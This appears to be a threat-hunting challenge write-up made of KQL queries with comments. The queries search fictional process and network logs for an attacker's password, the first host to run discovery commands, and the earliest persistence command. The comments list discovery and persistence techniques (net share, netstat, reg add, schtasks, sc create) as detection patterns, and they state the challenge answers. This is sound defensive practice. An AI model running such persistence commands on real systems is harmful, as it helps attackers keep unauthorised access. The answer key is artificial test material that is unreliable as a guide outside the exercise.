//Right after the victims downloaded the files from Q3, the attackers ran a command to connect to their infrastructure. What is the password?
//check the timestand of the downloaed


  let downloaded_files = datatable(filename: string)
[
  "AsteroidMiningBrief.ppt",
  "LunarBaseProject.pdf",
  "SpaceportProposal.docx",
  "SpaceInvestmentProjections.xlsx"
];
let download_times =
OutboundNetworkEvents
  | where url has_any (downloaded_files)
  | project timestamp, url
  | order by timestamp desc
  | take 1;
ProcessEvents
  | where process_commandline contains "-pw"
  | parse process_commandline with * "-pw " extracted_password " " *
  | distinct extracted_password
  // the password is Aliens!:D

 // The attackers ran commands to discover more about their victims’ network. What is the hostname of the first victim with these commands? This includes compromised hosts that may have been impacted outside of the file in Q3.
//1- we know discovery command has no .exe or c:// lets check
// more simple way 
ProcessEvents
  | where process_commandline !contains "C:" and process_commandline !contains ".exe"
  | distinct process_commandline

//Discovery Commands found:

//net share — Lists shared network resources
//netstat -aon — Shows all network connections and owning processes
//nbtstat -n — Displays NetBIOS name table (local names)
//ipconfig /all — Displays all IP configuration details
//nbtstat -s — Lists all NetBIOS sessions with IP addresses

// 2- now which hostname is the first victim with this command?
ProcessEvents
  | where process_commandline has_any ("net share", "netstat -aon", "nbtstat -n", "ipconfig /all", "nbtstat -s")
  | order by timestamp asc
  | take 1
  | project hostname, timestamp, process_commandline
  //OWQK-MACHINE	7/1/2123, 3:00:26 PM	nbtstat -n

//When did the attackers first run a command to maintain their foothold in victim devices despite restarts, changed credentials, and other interruptions?

//Attackers use these to maintain access after restarts/credential changes:

//reg add — Adding to Windows Run registry keys
//schtasks — Creating scheduled tasks
//sc create — Creating services
//Startup folder modifications
//Task Scheduler commands

ProcessEvents
  | where process_commandline has_any ("reg add", "schtasks", "sc create", "wmic")
  | order by timestamp asc
  | take 1
  | project timestamp, hostname, process_commandline
  //2123-07-19T12:00:03.000Z
